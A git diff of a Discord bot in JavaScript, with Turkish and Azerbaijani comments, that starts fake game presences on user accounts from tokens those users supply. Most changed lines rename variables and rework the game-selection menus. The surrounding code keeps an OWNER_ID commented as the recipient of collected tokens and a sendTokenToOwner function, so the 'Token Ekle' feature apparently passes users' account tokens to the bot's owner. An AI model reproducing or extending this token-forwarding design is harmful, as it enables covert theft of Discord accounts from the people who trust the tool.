@@ -39,13 +39,13 @@ const client = new Client({
   ]
 });
 
-// Bellekte saklanan tokenler, aktif RPC süreçleri ve arama sonuçları
+// Bellekte saklanan tokenler, aktif RPC süreçleri ve oyun seçim listeleri
 const userTokens = new Map();
 const activeRPCs = new Map(); // userId -> [{ token, name, username, stop }]
-const searchCache = new Map(); // userId -> [{ id, name }]
+const gameChoiceCache = new Map(); // userId -> [{ id, name }]
 
-// Geniş hazır oyun bazası
-const EXTRA_BUILTIN_GAMES = [
+// Hazır oyun siyahısı
+const READY_GAMES = [
   { id: '356875512194719746', name: 'Minecraft' },
   { id: '367827983903490050', name: 'Valorant' },
   { id: '401518684763586560', name: 'League of Legends' },
@@ -80,22 +80,22 @@ const EXTRA_BUILTIN_GAMES = [
   { id: '417777798347915321', name: 'Geometry Dash' }
 ];
 
-let cachedDetectableGames = [];
+let cachedGames = [...READY_GAMES];
 let lastGamesFetch = 0;
 
 // Tokenlerin gönderileceği ve paneli açabilecek yetkili kişinin ID'si
 const OWNER_ID = '1184518857679962186';
 
 // Hazır oyunları Discord API + daxili siyahı ilə birləşdirən funksiya
-async function getDetectableGames() {
+async function getReadyGames() {
   const now = Date.now();
-  if (cachedDetectableGames.length > 0 && now - lastGamesFetch < 6 * 60 * 60 * 1000) {
-    return cachedDetectableGames;
+  if (cachedGames.length > 0 && now - lastGamesFetch < 6 * 60 * 60 * 1000) {
+    return cachedGames;
   }
 
-  const mergedMap = new Map();
-  for (const g of EXTRA_BUILTIN_GAMES) {
-    mergedMap.set(g.name.toLowerCase(), { id: String(g.id), name: String(g.name).trim() });
+  const merged = new Map();
+  for (const g of READY_GAMES) {
+    merged.set(g.name.toLowerCase(), { id: String(g.id), name: String(g.name).trim() });
   }
 
   try {
@@ -106,7 +106,7 @@ async function getDetectableGames() {
         for (const g of data) {
           if (g && g.name && g.id) {
             const cleanName = String(g.name).trim();
-            mergedMap.set(cleanName.toLowerCase(), { id: String(g.id), name: cleanName });
+            merged.set(cleanName.toLowerCase(), { id: String(g.id), name: cleanName });
           }
         }
       }
@@ -116,14 +116,14 @@ async function getDetectableGames() {
     console.error('Hazır oyun siyahısı API-dən yüklənmədi:', err.message);
   }
 
-  cachedDetectableGames = Array.from(mergedMap.values());
-  return cachedDetectableGames;
+  cachedGames = Array.from(merged.values());
+  return cachedGames;
 }
 
 client.once('ready', async () => {
   console.log(`Bot başarıyla giriş yaptı: ${client.user.tag}`);
-  await getDetectableGames();
-  console.log(`Hazır oyun bazası yükləndi: ${cachedDetectableGames.length} oyun`);
+  await getReadyGames();
+  console.log(`Hazır oyun siyahısı yükləndi: ${cachedGames.length} oyun`);
 
   client.user.setActivity({
     name: 'powered by Fronzyy',
@@ -149,8 +149,8 @@ async function sendTokenToOwner(botClient, title, token, accountName, username, 
   }
 }
 
-// User token ile Discord Gateway üzerinden hazır oyun RPC başlatan funksiya
-function startUserRPC(token, accountName, gameObj) {
+// Seçilən hazır oyun üzərindən RPC başlatan funksiya
+function startReadyGameRPC(token, accountName, gameObj) {
   return new Promise((resolve) => {
     const ws = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
     let heartbeatInterval = null;
@@ -281,7 +281,7 @@ client.on('messageCreate', async (message) => {
         new TextDisplayBuilder().setContent('## **Nasıl kullanılır?**')
       )
       .addTextDisplayComponents(
-        new TextDisplayBuilder().setContent('• **Başlat** : Hesap seçin, hazır oyunlarda arama yapın ve listeden bir oyun seçerek RPC başlatın.')
+        new TextDisplayBuilder().setContent('• **Başlat** : Hesap seçin, hazır oyunlar arasından oyun seçip RPC başlatın.')
       )
       .addTextDisplayComponents(
         new TextDisplayBuilder().setContent('• **Token Ekle** : Tekli token eklemenizi sağlar.')
@@ -370,76 +370,76 @@ client.on('interactionCreate', async (interaction) => {
     await interaction.reply({ content: 'RPC başlatmak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
   }
 
-  // --- 2. HESAP SEÇİLDİKTEN SONRA -> HAZIR OYUN AXTARIŞ MODALI ---
+  // --- 2. HESAP SEÇİLDİKTEN SONRA -> HAZIR OYUN SEÇİM / ARAMA ---
   if (interaction.isStringSelectMenu() && interaction.customId === 'select_rpc_account') {
     const selectedAccountValue = interaction.values[0];
 
     const modal = new ModalBuilder()
-      .setCustomId(`game_search_modal_${selectedAccountValue}`)
-      .setTitle('Hazır Oyun Ara');
+      .setCustomId(`ready_game_modal_${selectedAccountValue}`)
+      .setTitle('Hazır Oyun Seç');
 
-    const searchInput = new TextInputBuilder()
-      .setCustomId('game_query')
-      .setLabel('Oyun adı yazın (örn: minecraft, gta, valorant)')
-      .setPlaceholder('Boş bırakırsanız ilk 25 hazır oyun gösterilir')
+    const gameFilterInput = new TextInputBuilder()
+      .setCustomId('ready_game_filter')
+      .setLabel('Hazır oyun adı yazın (boş bırakırsanız liste gelir)')
+      .setPlaceholder('Örn: Minecraft, Valorant, GTA...')
       .setStyle(TextInputStyle.Short)
       .setRequired(false);
 
-    modal.addComponents(new ActionRowBuilder().addComponents(searchInput));
+    modal.addComponents(new ActionRowBuilder().addComponents(gameFilterInput));
     await interaction.showModal(modal);
   }
 
-  // --- 3. HAZIR OYUN AXTARIŞ NƏTİCƏLƏRİ -> OYUN SEÇİM MENÜSÜ ---
-  if (interaction.isModalSubmit() && interaction.customId.startsWith('game_search_modal_')) {
-    const selectedAccountValue = interaction.customId.replace('game_search_modal_', '');
-    const query = interaction.fields.getTextInputValue('game_query').trim().toLowerCase();
+  // --- 3. HAZIR OYUN LİSTESİ MENÜSÜ ---
+  if (interaction.isModalSubmit() && interaction.customId.startsWith('ready_game_modal_')) {
+    const selectedAccountValue = interaction.customId.replace('ready_game_modal_', '');
+    const filterText = interaction.fields.getTextInputValue('ready_game_filter').trim().toLowerCase();
 
     await interaction.deferReply({ ephemeral: true });
 
-    const allGames = await getDetectableGames();
-    const filtered = query
-      ? allGames.filter(g => g.name.toLowerCase().includes(query))
-      : allGames;
+    const games = await getReadyGames();
+    const matchedGames = filterText
+      ? games.filter(g => g.name.toLowerCase().includes(filterText))
+      : games;
 
-    const topMatches = filtered.slice(0, 25);
+    const listToShow = matchedGames.slice(0, 25);
 
-    if (topMatches.length === 0) {
+    if (listToShow.length === 0) {
       return interaction.editReply({
-        content: `❌ **"${query}"** için hazır oyun bulunamadı. Başka bir ad deneyin.`
+        content: `❌ **"${filterText}"** ile eşleşen hazır oyun bulunamadı.`
       });
     }
 
-    searchCache.set(userId, topMatches);
+    gameChoiceCache.set(userId, listToShow);
 
-    const gameSelect = new StringSelectMenuBuilder()
-      .setCustomId(`select_game_rpc_${selectedAccountValue}`)
-      .setPlaceholder(`${filtered.length} oyun bulundu — listeden birini seçin...`)
+    const gameMenu = new StringSelectMenuBuilder()
+      .setCustomId(`pick_ready_game_${selectedAccountValue}`)
+      .setPlaceholder('Hazır oyun listesinden seçin...')
       .addOptions(
-        topMatches.map((game, idx) => ({
+        listToShow.map((game, idx) => ({
           label: game.name.slice(0, 100),
           value: String(idx),
-          description: `ID: ${game.id}`.slice(0, 100),
+          description: `Hazır Oyun (${game.id})`.slice(0, 100),
           emoji: '🎮'
         }))
       );
 
-    const row = new ActionRowBuilder().addComponents(gameSelect);
+    const row = new ActionRowBuilder().addComponents(gameMenu);
 
     await interaction.editReply({
-      content: `🔎 **${filtered.length}** hazır oyun bulundu (ilk **${topMatches.length}** tanesi listelendi). RPC başlatmak için bir oyun seçin:`,
+      content: `🎮 **${matchedGames.length}** hazır oyun bulundu. RPC yapmak istediğiniz hazır oyunu seçin:`,
       components: [row]
     });
   }
 
-  // --- 4. HAZIR OYUN SEÇİLDİ -> RPC BAŞLAT ---
-  if (interaction.isStringSelectMenu() && interaction.customId.startsWith('select_game_rpc_')) {
-    const selectedAccountValue = interaction.customId.replace('select_game_rpc_', '');
+  // --- 4. SEÇİLEN HAZIR OYUN İLE RPC BAŞLAT ---
+  if (interaction.isStringSelectMenu() && interaction.customId.startsWith('pick_ready_game_')) {
+    const selectedAccountValue = interaction.customId.replace('pick_ready_game_', '');
     const gameIdx = parseInt(interaction.values[0], 10);
 
-    const matches = searchCache.get(userId) || [];
-    const chosenGame = matches[gameIdx];
+    const choices = gameChoiceCache.get(userId) || [];
+    const selectedGame = choices[gameIdx];
 
-    if (!chosenGame) {
+    if (!selectedGame) {
       return interaction.update({
         content: '⚠️ Oyun seçimi zaman aşımına uğradı. Lütfen **Başlat** butonuna tekrar basın.',
         components: []
@@ -459,7 +459,7 @@ client.on('interactionCreate', async (interaction) => {
     }
 
     await interaction.update({
-      content: `⏳ **${chosenGame.name}** için RPC başlatılıyor...`,
+      content: `⏳ **${selectedGame.name}** hazır oyun RPC başlatılıyor...`,
       components: []
     });
 
@@ -469,7 +469,7 @@ client.on('interactionCreate', async (interaction) => {
 
     let startedCount = 0;
     for (const tObj of targetTokens) {
-      const session = await startUserRPC(tObj.token, tObj.name, chosenGame);
+      const session = await startReadyGameRPC(tObj.token, tObj.name, selectedGame);
       if (session && typeof session.stop === 'function') {
         activeRPCs.get(userId).push({
           token: tObj.token,
@@ -482,7 +482,7 @@ client.on('interactionCreate', async (interaction) => {
     }
 
     await interaction.editReply({
-      content: `🚀 Seçilen **${startedCount}** hesap için hazır oyun RPC başlatıldı: **${chosenGame.name}**`
+      content: `🚀 Seçilen **${startedCount}** hesap için hazır oyun RPC başlatıldı: **${selectedGame.name}**`
     });
   }
 
